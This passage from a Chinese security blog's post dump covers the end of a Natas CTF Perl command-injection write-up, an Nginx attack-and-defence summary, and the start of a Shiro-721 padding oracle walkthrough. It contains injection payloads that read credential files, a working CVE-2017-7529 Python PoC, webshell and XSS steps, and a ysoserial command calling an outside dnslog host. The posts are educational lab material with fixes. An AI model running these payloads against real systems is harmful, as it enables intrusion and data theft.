2&lt;/option&gt; &lt;option value=\"perl underground 3\"&gt;perl underground 3&lt;/option&gt; &lt;option value=\"perl underground 4\"&gt;perl underground 4&lt;/option&gt; &lt;option value=\"perl underground 5\"&gt;perl underground 5&lt;/option&gt;&lt;/select&gt;&lt;/form&gt;ENDif(param('file'))&#123; $f=param('file'); if($f=~/natas/)&#123; print \"meeeeeep!&lt;br&gt;\"; &#125; else&#123; open(FD, \"$f.txt\"); print \"&lt;pre&gt;\"; while (&lt;FD&gt;)&#123; print CGI::escapeHTML($_); &#125; print \"&lt;/pre&gt;\"; &#125;&#125;print &lt;&lt;END;&lt;div id=\"viewsource\"&gt;c4n Y0 h4z s4uc3?&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;END 从源码看到，关键的漏洞点就是open(FD, &quot;$f.txt&quot;);，这里直接将外部输入的file参数和后缀名”.txt”拼接后直接放进open()函数中执行，导致了命令注入漏洞的存在。 靶场的要求是获得下一关即第30关的密码，这里看源码发现检测file参数值是否存在”natas”，因此需要结合一些shell技巧来绕过这个检测，可以输入如下一些命令绕过并搜索下一关的相关文件： 123456789|find / -name nat&apos;&apos;as30%00|find / -name nat&quot;&quot;as30%00|find / -name nat``as30%00|find / -name nat\\as30%00|find / -name nat?s30%00|find / -name nat$&#123;x&#125;as30%00|find / -name nat$(echo a)s30%00|find / -name nat`echo a`s30%00|find / -name n$&#123;SHELLOPTS:2:1&#125;t$&#123;SHELLOPTS:2:1&#125;s30%00 # failed 最后读取该文件即可|cat /etc/nat&#39;&#39;as_webpass/nat&#39;&#39;as30%00： 小结：该场景的漏洞点在于open()函数命令注入+%00截断。 0x04 参考Security Issues in Perl Scripts Perl 安全","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"代码审计","slug":"代码审计","permalink":"https://www.mi1k7ea.com/tags/代码审计/"},{"name":"Perl","slug":"Perl","permalink":"https://www.mi1k7ea.com/tags/Perl/"}]},{"title":"Nginx安全小结","date":"2020-10-25T08:08:45.000Z","path":"2020/10/25/Nginx安全小结/","text":"0x00 前言这里小结下Nginx这个常见Web中间件的安全攻防问题。 0x01 Nginx基础Nginx简介Nginx（engine x）是一个高性能的HTTP和反向代理Web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。 Nginx是一款轻量级的Web服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like协议下发行。其特点是占有内存少，并发能力强，事实上Nginx的并发能力在同类型的网页服务器中表现较好。 Nginx具有以下特点： 处理静态文件，索引文件以及自动索引；打开文件描述符缓冲． 无缓存的反向代理加速，简单的负载均衡和容错． FastCGI，简单的负载均衡和容错． 模块化的结构。包括 gzipping, byte ranges, chunked responses,以及 SSI-filter 等 filter。如果由 FastCGI 或其它代理服务器处理单页中存在的多个 SSI，则这项处理可以并行运行，而不需要相互等待。 支持 SSL 和 TLSSNI． Nginx组成架构Nginx由内核和模块组成。 Nginx内核的设计非常微小和简洁，完成的工作也非常简单，仅仅通过查找配置文件将客户端请求映射到一个location block（location是Nginx配置中的一个指令，用于URL匹配），而在这个location中所配置的每个指令将会启动不同的模块去完成相应的工作。 Nginx的模块从结构上分为： 核心模块：HTTP模块、 EVENT模块和MAIL模块； 基础模块： HTTP Access模块、HTTP FastCGI模块、HTTP Proxy模块和HTTP Rewrite模块； 第三方模块：HTTP Upstream Request Hash模块、 Notice模块和HTTP Access Key模块； Nginx安装配置参考：https://www.runoob.com/linux/nginx-install-setup.html Nginx中HTTP请求流程Nginx中一个HTTP请求的处理流程如图： Nginx配置文件详解如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332######Nginx配置文件nginx.conf中文详解######定义Nginx运行的用户和用户组user www www;#nginx进程数，建议设置为等于CPU总核心数。worker_processes 8; #全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]error_log /usr/local/nginx/logs/error.log info;#进程pid文件pid /usr/local/nginx/logs/nginx.pid;#指定进程可以打开的最大描述符：数目#工作模式与连接数上限#这个指令是指当一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（ulimit -n）与nginx进程数相除，但是nginx分配请求并不是那么均匀，所以最好与ulimit -n 的值保持一致。#现在在linux 2.6内核下开启文件打开数为65535，worker_rlimit_nofile就相应应该填写65535。#这是因为nginx调度时分配请求到进程并不是那么的均衡，所以假如填写10240，总并发量达到3-4万时就有进程可能超过10240了，这时会返回502错误。worker_rlimit_nofile 65535;events&#123; #参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型 #是Linux 2.6以上版本内核中的高性能网络I/O模型，linux建议epoll，如果跑在FreeBSD上面，就用kqueue模型。 #补充说明： #与apache相类，nginx针对不同的操作系统，有不同的事件模型 #A）标准事件模型 #Select、poll属于标准事件模型，如果当前系统不存在更有效的方法，nginx会选择select或poll #B）高效事件模型 #Kqueue：使用于FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0 和 MacOS X.使用双处理器的MacOS X系统使用kqueue可能会造成内核崩溃。 #Epoll：使用于Linux内核2.6版本及以后的系统。 #/dev/poll：使用于Solaris 7 11/99+，HP/UX 11.22+ (eventport)，IRIX 6.5.15+ 和 Tru64 UNIX 5.1A+。 #Eventport：使用于Solaris 10。 为了防止出现内核崩溃的问题， 有必要安装安全补丁。 use epoll; #单个进程最大连接数（最大连接数=连接数*进程数） #根据硬件调整，和前面工作进程配合起来用，尽量大，但是别把cpu跑到100%就行。每个进程允许的最多连接数，理论上每台nginx服务器的最大连接数为。 worker_connections 65535; #keepalive超时时间。 keepalive_timeout 60; #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求头的大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。 #分页大小可以用命令getconf PAGESIZE 取得。 #[root@web001 ~]# getconf PAGESIZE #4096 #但也有client_header_buffer_size超过4k的情况，但是client_header_buffer_size该值必须设置为“系统分页大小”的整倍数。 client_header_buffer_size 4k; #这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。 open_file_cache max=65535 inactive=60s; #这个是指多长时间检查一次缓存的有效信息。 #语法:open_file_cache_valid time 默认值:open_file_cache_valid 60 使用字段:http, server, location 这个指令指定了何时需要检查open_file_cache中缓存项目的有效信息. open_file_cache_valid 80s; #open_file_cache指令中的inactive参数时间内文件的最少使用次数，如果超过这个数字，文件描述符一直是在缓存中打开的，如上例，如果有一个文件在inactive时间内一次没被使用，它将被移除。 #语法:open_file_cache_min_uses number 默认值:open_file_cache_min_uses 1 使用字段:http, server, location 这个指令指定了在open_file_cache指令无效的参数中一定的时间范围内可以使用的最小文件数,如果使用更大的值,文件描述符在cache中总是打开状态. open_file_cache_min_uses 1; #语法:open_file_cache_errors on | off 默认值:open_file_cache_errors off 使用字段:http, server, location 这个指令指定是否在搜索一个文件时记录cache错误. open_file_cache_errors on;&#125; #设定http服务器，利用它的反向代理功能提供负载均衡支持http&#123; #文件扩展名与文件类型映射表 include mime.types; #默认文件类型 default_type application/octet-stream; #默认编码 #charset utf-8; #服务器名字的hash表大小 #保存服务器名字的hash表是由指令server_names_hash_max_size 和server_names_hash_bucket_size所控制的。参数hash bucket size总是等于hash表的大小，并且是一路处理器缓存大小的倍数。在减少了在内存中的存取次数后，使在处理器中加速查找hash表键值成为可能。如果hash bucket size等于一路处理器缓存的大小，那么在查找键的时候，最坏的情况下在内存中查找的次数为2。第一次是确定存储单元的地址，第二次是在存储单元中查找键 值。因此，如果Nginx给出需要增大hash max size 或 hash bucket size的提示，那么首要的是增大前一个参数的大小. server_names_hash_bucket_size 128; #客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求的头部大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。分页大小可以用命令getconf PAGESIZE取得。 client_header_buffer_size 32k; #客户请求头缓冲大小。nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取。 large_client_header_buffers 4 64k; #设定通过nginx上传文件的大小 client_max_body_size 8m; #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。 #sendfile指令指定 nginx 是否调用sendfile 函数（zero copy 方式）来输出文件，对于普通应用，必须设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime。 sendfile on; #开启目录列表访问，合适下载服务器，默认关闭。 autoindex on; #此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用 tcp_nopush on; tcp_nodelay on; #长连接超时时间，单位是秒 keepalive_timeout 120; #FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。 fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; fastcgi_buffer_size 64k; fastcgi_buffers 4 64k; fastcgi_busy_buffers_size 128k; fastcgi_temp_file_write_size 128k; #gzip模块设置 gzip on; #开启gzip压缩输出 gzip_min_length 1k; #最小压缩文件大小 gzip_buffers 4 16k; #压缩缓冲区 gzip_http_version 1.0; #压缩版本（默认1.1，前端如果是squid2.5请使用1.0） gzip_comp_level 2; #压缩等级 gzip_types text/plain application/x-javascript text/css application/xml; #压缩类型，默认就已经包含textml，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。 gzip_vary on; #开启限制IP连接数的时候需要使用 #limit_zone crawler $binary_remote_addr 10m; #负载均衡配置 upstream jh.w3cschool.cn &#123; #upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。 server 192.168.80.121:80 weight=3; server 192.168.80.122:80 weight=2; server 192.168.80.123:80 weight=3; #nginx的upstream目前支持4种方式的分配 #1、轮询（默认） #每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。 #2、weight #指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。 #例如： #upstream bakend &#123; # server 192.168.0.14 weight=10; # server 192.168.0.15 weight=10; #&#125; #2、ip_hash #每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。 #例如： #upstream bakend &#123; # ip_hash; # server 192.168.0.14:88; # server 192.168.0.15:80; #&#125; #3、fair（第三方） #按后端服务器的响应时间来分配请求，响应时间短的优先分配。 #upstream backend &#123; # server server1; # server server2; # fair; #&#125; #4、url_hash（第三方） #按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。 #例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法 #upstream backend &#123; # server squid1:3128; # server squid2:3128; # hash $request_uri; # hash_method crc32; #&#125; #tips: #upstream bakend&#123;#定义负载均衡设备的Ip及设备状态&#125;&#123; # ip_hash; # server 127.0.0.1:9090 down; # server 127.0.0.1:8080 weight=2; # server 127.0.0.1:6060; # server 127.0.0.1:7070 backup; #&#125; #在需要使用负载均衡的server中增加 proxy_pass http://bakend/; #每个设备的状态设置为: #1.down表示单前的server暂时不参与负载 #2.weight为weight越大，负载的权重就越大。 #3.max_fails：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream模块定义的错误 #4.fail_timeout:max_fails次失败后，暂停的时间。 #5.backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。 #nginx支持同时设置多组的负载均衡，用来给不用的server来使用。 #client_body_in_file_only设置为On 可以讲client post过来的数据记录到文件中用来做debug #client_body_temp_path设置记录文件的目录 可以设置最多3层目录 #location对URL进行匹配.可以进行重定向或者进行新的代理 负载均衡 &#125; #虚拟主机的配置 server &#123; #监听端口 listen 80; #域名可以有多个，用空格隔开 server_name www.w3cschool.cn w3cschool.cn; index index.html index.htm index.php; root /data/www/w3cschool; #对******进行负载均衡 location ~ .*.(php|php5)?$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi.conf; &#125; #图片缓存时间设置 location ~ .*.(gif|jpg|jpeg|png|bmp|swf)$ &#123; expires 10d; &#125; #JS和CSS缓存时间设置 location ~ .*.(js|css)?$ &#123; expires 1h; &#125; #日志格式设定 #$remote_addr与$http_x_forwarded_for用以记录客户端的ip地址； #$remote_user：用来记录客户端用户名称； #$time_local： 用来记录访问时间与时区； #$request： 用来记录请求的url与http协议； #$status： 用来记录请求状态；成功是200， #$body_bytes_sent ：记录发送给客户端文件主体内容大小； #$http_referer：用来记录从那个页面链接访问过来的； #$http_user_agent：记录客户浏览器的相关信息； #通常web服务器放在反向代理的后面，这样就不能获取到客户的IP地址了，通过$remote_add拿到的IP地址是反向代理服务器的iP地址。反向代理服务器在转发请求的http头信息中，可以增加x_forwarded_for信息，用以记录原有客户端的IP地址和原来客户端的请求的服务器地址。 log_format access '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" $http_x_forwarded_for'; #定义本虚拟主机的访问日志 access_log /usr/local/nginx/logs/host.access.log main; access_log /usr/local/nginx/logs/host.access.404.log log404; #对 \"/\" 启用反向代理 location / &#123; proxy_pass http://127.0.0.1:88; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #以下是一些反向代理的配置，可选。 proxy_set_header Host $host; #允许客户端请求的最大单文件字节数 client_max_body_size 10m; #缓冲区代理缓冲用户端请求的最大字节数， #如果把它设置为比较大的数值，例如256k，那么，无论使用firefox还是IE浏览器，来提交任意小于256k的图片，都很正常。如果注释该指令，使用默认的client_body_buffer_size设置，也就是操作系统页面大小的两倍，8k或者16k，问题就出现了。 #无论使用firefox4.0还是IE8.0，提交一个比较大，200k左右的图片，都返回500 Internal Server Error错误 client_body_buffer_size 128k; #表示使nginx阻止HTTP应答代码为400或者更高的应答。 proxy_intercept_errors on; #后端服务器连接的超时时间_发起握手等候响应超时时间 #nginx跟后端服务器连接超时时间(代理连接超时) proxy_connect_timeout 90; #后端服务器数据回传时间(代理发送超时) #后端服务器数据回传时间_就是在规定时间之内后端服务器必须传完所有的数据 proxy_send_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时) #连接成功后_等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间） proxy_read_timeout 90; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 #设置从被代理服务器读取的第一部分应答的缓冲区大小，通常情况下这部分应答中包含一个小的应答头，默认情况下这个值的大小为指令proxy_buffers中指定的一个缓冲区的大小，不过可以将其设置为更小 proxy_buffer_size 4k; #proxy_buffers缓冲区，网页平均在32k以下的设置 #设置用于读取应答（来自被代理服务器）的缓冲区数目和大小，默认情况也为分页大小，根据操作系统的不同可能是4k或者8k proxy_buffers 4 32k; #高负荷下缓冲大小（proxy_buffers*2） proxy_busy_buffers_size 64k; #设置在写入proxy_temp_path时数据的大小，预防一个工作进程在传递文件时阻塞太长 #设定缓存文件夹大小，大于这个值，将从upstream服务器传 proxy_temp_file_write_size 64k; &#125; #设定查看Nginx状态的地址 location /NginxStatus &#123; stub_status on; access_log on; auth_basic \"NginxStatus\"; auth_basic_user_file confpasswd; #htpasswd文件的内容可以用apache提供的htpasswd工具来产生。 &#125; #本地动静分离反向代理配置 #所有jsp的页面均交由tomcat或resin处理 location ~ .(jsp|jspx|do)?$ &#123; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080; &#125; #所有静态文件由nginx直接读取不经过tomcat或resin location ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt| pdf|xls|mp3|wma)$ &#123; expires 15d; &#125; location ~ .*.(js|css)?$ &#123; expires 1h; &#125; &#125;&#125;######Nginx配置文件nginx.conf中文详解##### 0x02 Nginx解析漏洞Nginx解析漏洞主要分为以下两种。 未知文件解析漏洞漏洞原理该漏洞与Nginx版本、PHP版本无关，属于用户配置不当造成的解析漏洞。 两个核心配置： cgi.fix_pathinfo：php.ini的配置项，当该配置项值为1时，用于修复路径，如果当前路径不存在则采用上层路径，比如传入/test.png/1.php路径、由于1.php不存在则会在传给FastCGI处理的路径就变为test.png。该配置项默认为1； security.limit_extensions：php-fpm.conf配置项，此配置项限制了FastCGI解析文件的类型（即指定什么类型的文件当做PHP代码解析），但此项设置为空时是允许FastCGI将任意类型的文件当做PHP代码来解析的； 环境搭建直接用的Vulhub：https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/ 漏洞复现先使用copy命令制作一个图片马： 1copy /b noface.jpg + shell.php/a = muma.jpg 上传图片马，能正常访问： URL栏追加/xx.php后缀即可触发解析漏洞，成功解析图片马： 漏洞分析漏洞根源就是配置存在问题，直接看配置文件的设置。 先看到php.ini，这里环境没有php.ini文件，直接看php.ini-development或php.ini-production，其中并没有配置cgi.fix_pathino配置项，但是其默认值就是1，即启用修复路径，在前面输入路径/uploadfiles/91f1d6b9e6e11024e0ae83cbce848c7f.jpg/1.php时，由于1.php不存在因此实际传入给FastCGI的是/uploadfiles/91f1d6b9e6e11024e0ae83cbce848c7f.jpg路径来进行解析： 接着看php-fpm.conf，文件内容中没有security.limit_extensions配置项，但是include=etc/php-fpm.d/*.conf引入了该目录中的所有.conf文件，在其中的www-2.conf文件中找到了该配置项，且该配置项为空，即没有进行任何限制、可以以PHP代码来解析由上层Nginx传下来的/uploadfiles/91f1d6b9e6e11024e0ae83cbce848c7f.jpg路径文件，从而触发解析漏洞： 修复方法针对配置项修复即可： 修改php.ini文件中cgi.fix_pathino配置项的值为0； 添加php-fpm.conf文件中security.limit_extensions配置项的值为php，即限定FastCGI只对PHP相关后缀文件进行PHP代码解析； 文件名逻辑漏洞（CVE-2013-4547）影响版本Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 漏洞原理由于Nginx存在文件名逻辑漏洞、会错误地解析请求的URI，导致获取到了错误的文件名，从而可能造成权限绕过、代码执行等安全漏洞。 环境搭建直接用的Vulhub：https://vulhub.org/#/environments/nginx/CVE-2013-4547/ 漏洞复现最大的危害当然就是解析漏洞了，能解析PHP代码从而执行任意命令。 直接上传WebShell文件，修改文件名后缀为”.jpg “，即在文件后缀名后面追加个空格： 访问http://your-ip:8080/uploadfiles/shell.jpg[0x20][0x00].php来触发漏洞，这里直接在Hex栏修改： 当然，除了解析漏洞外，文件名逻辑漏洞还能造成访问限制绕过等的安全风向。 这里修改下nginx.conf配置，/admin/目录限定只能本地访问： 然后在Web目录中新建admin子目录，其中新建index.php文件，内容随意。 接着，在Linux中，Web目录中新建”mi1k7ea “子目录，注意目录名最后必须为空格。这是因为在Linux中，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下则没有这个限制。 因为不是本地请求，外部用户是没法访问到/admin/目录中的内容的： 但是结合文件名逻辑漏洞，就可以绕过Nginx路由限制来越权访问（注意空格不要编码）： 漏洞分析漏洞根源就是配置存在问题，直接看配置文件的设置。这里以解析漏洞的实例分析。 先看到nginx.conf，当Nginx匹配到.php结尾的请求，就发送给FastCGI进行解析： 这个配置很正常，但是在漏洞版本的Nginx中，如果收到shell.jpg[0x20][0x00].php的请求时，这个URI可以匹配上如上图的正则\\.php$的Location块，其中Nginx会识别到请求的文件是shell.jpg[0x20]，就设置其为SCRIPT_FILENAME的值发送给FastCGI进行解析，而PHP-FPM中并未设置security.limit_extensions配置项的值，从而可以以PHP代码来解析shell.jpg[0x20]文件，触发解析漏洞： 修复方法 升级Nginx版本； 添加php-fpm.conf文件中security.limit_extensions配置项的值为php，即限定FastCGI只对PHP相关后缀文件进行PHP代码解析； %00截断解析漏洞这部分Nginx版本过低，已经很少见了，漏洞原理也很简单，就不搞靶场了。 影响版本Nginx 0.5.*, 0.6.*, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37 漏洞原理对于低版本的Nginx，可以在任意文件名后面添加%00.php进行解析攻击。 如：1.jpg%00.php就会将前面1.jpg文件当成PHP文件进行解析执行。 修复方法升级Nginx版本； 0x03 Nginx整数溢出漏洞（CVE-2017-7529）影响版本Nginx 0.5.6 ~ 1.13.2 漏洞原理 Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 环境搭建直接用的Vulhub：https://vulhub.org/#/environments/nginx/CVE-2017-7529/ 当然也可以自己用Docker搭建，参考旧博客：使用Docker搭建Nginx整数溢出漏洞（CVE-2017-7529）及Python PoC验证 漏洞复现正常访问Web页面，是Nginx默认页面，该页面实际上是反向代理的8081端口的内容： 这里直接看P神Vulhub中的PoC，就是： 123456789101112131415161718192021#!/usr/bin/env pythonimport sysimport requestsif len(sys.argv) &lt; 2: print(\"%s url\" % (sys.argv[0])) print(\"eg: python %s http://your-ip:8080/\" % (sys.argv[0])) sys.exit()headers = &#123; 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\"&#125;offset = 605url = sys.argv[1]file_len = len(requests.get(url, headers=headers).content)n = file_len + offsetheaders['Range'] = \"bytes=-%d,-%d\" % ( n, 0x8000000000000000 - n)r = requests.get(url, headers=headers)print(r.text) 运行python poc.py http://your-ip:8080/后，可以看到是越界读取到了Cache文件头及其内容（Nginx和被代理的服务器之间的响应报文头和Body内容等）： 漏洞分析先看到Nginx配置文件nginx.conf，其中包含了如下conf文件： 看到，其中关键Nginx设置如下： proxy_cache_path：设置缓存文件的路径和参数； proxy_cache_valid：设定缓存有效期； proxy_pass：反向代理配置，参数为代理的目标服务地址； proxy_cache：指定使用的keys_zone名称，这里就是上面的cache_zone； add_header：在Nginx返回的HTTP头中增加一项X-Proxy-Cache，如果缓存命中其值为HIT，未命中则为MISS； proxy_ignore_headers：Nginx不会缓存带有Set-Cookie的返回，因此这里设置忽略该HTTP头； 由此可知，正常访问之后，就会缓存目标页面内容到proxy_cache_path指定的目录中，查看确实存在Cache文件，前面部分是Cache文件头部信息包括Key，后面就是响应报文的内容： 可以看到，这和前面通过PoC脚本触发整数溢出漏洞来获取到的Cache文件内容是一致的。 OK，来看下根源的代码问题，从补丁修复代码看起，主要在ngx_http_range_filter_module.c的ngx_http_range_parse()函数上做了两次修改： Range filter: protect from total size overflows.：防止Range中total_size即总大小参数的整数溢出； Range filter: avoid negative range start.：防止Range中start参数为负数的整数溢出； 据此可知，本次整数溢出漏洞的漏洞点正是出在Nginx处理HTTP请求头Range的数值时并没有进行整数溢出漏洞过滤而导致的。其中bytes-range读取的起始范围可能为负数，从而读取缓存文件头部。 更多的漏洞分析请参考：CVE-2017-7529 Nginx整数溢出漏洞分析 修复方法升级Nginx版本； 0x04 Nginx不安全配置当Nginx配置不当时，也会导致一些安全问题。 下面的环境均搭建自Vulhub：https://vulhub.org/#/environments/nginx/insecure-configuration/ CRLF注入漏洞漏洞原理Nginx的内置遍历$uri是指当前的请求URI，不包括任何参数（见$args）。其中，Nginx会对$uri进行解码操作。如果攻击者在URI中注入%0a%0d就会造成CRLF注入漏洞。 Demo不安全配置示例如下，即直接将$uri拼接到302重定向的地址上，会造成CRLF注入漏洞： 直接在URI栏注入即可，比如注入Set-Cookie头： 可以往响应报文Body注入XSS payload，但是这里由于Location头的值协议不可控、302这处无法直接在浏览器触发RXSS： 防御方法审计Nginx配置文件中$uri的使用位置，禁止直接用在URL跳转地址的拼接上。 目录穿越漏洞漏洞原理Nginx服务器通过设置Alias别名的方式，可以使不在网站根目录下的目录也能被Web访问。 Nginx的配置autoindex作用是自动创建索引，换句话说就是目录浏览功能，当为on时页面可以显示当前目录下所有文件/目录内容，当为off时页面为403 Forbidden。 如果在配置别名（Alias）的时候，忘记在location的目录最后追加/，会导致存在目录穿越漏洞。 Demo看个不安全的配置示例： 正常访问，由于autoindex为on，页面就显示了home目录中的所有文件和目录： 访问/files../的时候就会目录穿越： 当然，并非autoindex开启了才能利用，只是说页面会展示出当前目录下所有的文件和目录信息而已，方便查看，即使不开启autoindex也能直接目录穿越获取目标文件、只是访问目录的时候为403而已。 比如去掉autoindex on这个配置后，访问/file../etc/目录时是403，但是访问具体文件就能直接下载了： 注意，此处场景目录穿越只能往上穿一层，示例中刚好上一层就是根目录因此可以看到所有文件和目录，但是实际场景可能目录穿越的利用很有限。 防御方法在Nginx配置文件中location的目录最后必须要追加/。 add_header被覆盖漏洞原理add_header是headers模块中定义的一个指令，用来添加HTTP响应头部。 Nginx是分层级组织的，每层可以有自己的指令，子块继承父块的配置；但对于相同指令，子块的配置可以覆盖掉父块的配置。子块中如果设置了add_header，那么就会覆盖掉父块中的add_header，这样就可能会造成一些安全风险。 Demo不安全的配置示例，原本在Web整站即父块中添加了CSP头和X-Frame-Options头设置的，其在子块/test1目录是直接使用生效的，但是在另一个子块/test2目录中会重新add_header导致前面整站的add_header设置被覆盖： 正常访问/test1目录，响应头确实设置了CSP头和X-Frame-Options头，其中页面是引用了一个JS文件： 这个JS文件就是往页面id为m的标签内写入当前URL中#号后面的内容，即存在DOM XSS风险： 这里注意个细节，如果直接引用这个JS脚本，无论后面有没有CSP都无法成功触发XSS，这是因为默认这个输出是对关键字符如尖括号进行了URL编码的，此时需要我们稍微改下app.js的代码，添加个URL解码操作即对获取到URI栏的内容调用decodeURI()函数才能成功： 1234window.onload = function() &#123; var m = document.getElementById('m'); m.innerHTML = decodeURI(location.hash.substr(1));&#125; 由于CSP设置为default-src &#39;self&#39;即只允许同源下的资源，这里/static/app.js是同源资源因此可以加载进来执行，但不允许内联资源（要允许内联资源需要设置’unsafe-inline’，其允许如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素等）。也就是说，即使注入XSS payload，如下的内联的on事件也是不会执行的： 当我们访问/test2目录时，看到响应报文并没有前面整站设置的CSP头和X-Frame-Options头，而是该子块直接设置的X-Content-Type-Options头，也就是说父块的add_header被子块的add_header覆盖了： 结合前面的存在DOM XSS风险，这里由于没有CSP限制所以能成功触发利用： 注意，这里XSS payload不能用&lt;script&gt;标签、会无法触发执行，这是因为这个DOM操作是用的innerHTML来进行的，需要用如&lt;img&gt;等标签来注入才能成功。 防御方法非必须不要设置在子块再次配置add_header来覆盖父块的add_header配置；如果业务需要必须设置，则需要严格审计是否会出现相关的安全风险。 0x05 参考Nginx 入门指南","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.mi1k7ea.com/tags/Nginx/"}]},{"title":"浅析Shiro Padding Oracle Attack（Shiro721）","date":"2020-10-14T12:27:34.000Z","path":"2020/10/14/浅析Shiro-Padding-Oracle-Attack（Shiro721）/","text":"0x01 漏洞原理由于Apache Shiro 1.4.1及其之前版本的Cookie中的rememberMe字段是使用AES-128-CBC模式来加密生成的，因此攻击者可以在已有的正常登陆的Cookie rememberMe值的基础上根据Padding Oracle Attack的原理来暴破构造出恶意的rememberMe字段，重新发送暴破出来的恶意rememberMe值到服务端进而触发反序列化漏洞达到RCE。 关键步骤如图： 0x02 影响版本Apache Shiro &lt;= 1.4.1 0x03 环境搭建远程环境搭建可参考：https://github.com/3ndz/Shiro-721 或者，本地搭建：下载samples-web-1.4.1.war，放置到本地Tomcat的webapp目录中即可。 注意，samples-web-1.4.1\\WEB-INF\\lib中的CommonsCollections包版本为3.2.2，并非漏洞版本，需要自行更换为3.2.1漏洞版本，否则后面的漏洞复现会失败。 0x04 前提条件 Apache Shiro Padding Oracle Attack的漏洞利用必须满足如下前提条件： 开启rememberMe功能； rememberMe值使用AES-CBC模式解密； 能获取到正常Cookie，即用户正常登录的Cookie值； 密文可控； 0x05 漏洞复现首先正常登录进去，勾选上rememberMe选项： 刷新当前页面或访问/account页面，获取此时登录成功的rememberMe值： 使用ysoserial工具生成URLDNS验证payload： 1java -jar ysoserial-master-6eca5bc740-1.jar URLDNS &quot;http://5zfnof.dnslog.cn&quot; &gt; payload.class 利用GitHub的exp来进行Padding Oracle Attack： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#https://github.com/3ndz/Shiro-721# -*- coding: utf-8 -*-from paddingoracle import BadPaddingException, PaddingOraclefrom base64 import b64encode, b64decodefrom urllib import quote, unquoteimport requestsimport socketimport timeclass 